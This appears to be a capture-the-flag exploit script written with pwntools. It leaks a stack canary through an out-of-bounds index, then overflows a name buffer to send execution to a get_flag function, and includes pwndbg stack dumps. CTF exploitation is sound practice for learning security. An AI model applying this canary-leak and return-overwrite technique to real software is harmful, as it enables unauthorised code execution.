#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
tbreak main
b edit_friend
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


sla(b'>> ', b'3')
sla(b'(0-7): ', b'13')

ru(b'index!\n', drop=True)
canary = u64(r(8))
info(f"Canary: {canary:#x}")

sla(b'>> ', b'2')
sla(b'(0-7): ', b'7')

sla(b'name: ', flat({
    0x30: canary,
    0x40: exe.sym.get_flag,
}))


sla(b'>> ', b'4')

ia()


"""
pwndbg> tele 0x7fff3343ff38
00:0000│ rcx rdi 0x7fff3343ff38 ◂— 0x78636974637261 /* 'arcticx' */
01:0008│+060     0x7fff3343ff40 ◂— 0xa32 /* '2\n' */
02:0010│+068     0x7fff3343ff48 ◂— 0
03:0018│+070     0x7fff3343ff50 ◂— 0
04:0020│+078     0x7fff3343ff58 —▸ 0x7355f46a0bd0 (dl_main) ◂— endbr64
05:0028│+080     0x7fff3343ff60 ◂— 0
06:0030│+088     0x7fff3343ff68 ◂— 0x275b3cdf8cb08b00
07:0038│+090     0x7fff3343ff70 —▸ 0x7fff33440010 —▸ 0x7fff33440070 ◂— 0


pwndbg> tele 0x7fff3343ff38
00:0000│ rax rcx 0x7fff3343ff38 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa'
01:0008│+060     0x7fff3343ff40 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa'
02:0010│+068     0x7fff3343ff48 ◂— 'eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa'
03:0018│+070     0x7fff3343ff50 ◂— 'gaaahaaaiaaajaaakaaalaaamaaanaaa'
04:0020│+078     0x7fff3343ff58 ◂— 'iaaajaaakaaalaaamaaanaaa'
05:0028│+080     0x7fff3343ff60 ◂— 'kaaalaaamaaanaaa'
06:0030│+088     0x7fff3343ff68 ◂— 'maaanaaa'
07:0038│+090     0x7fff3343ff70 ◂— 0x275b3cdf8cb08b00
pwndbg>

"""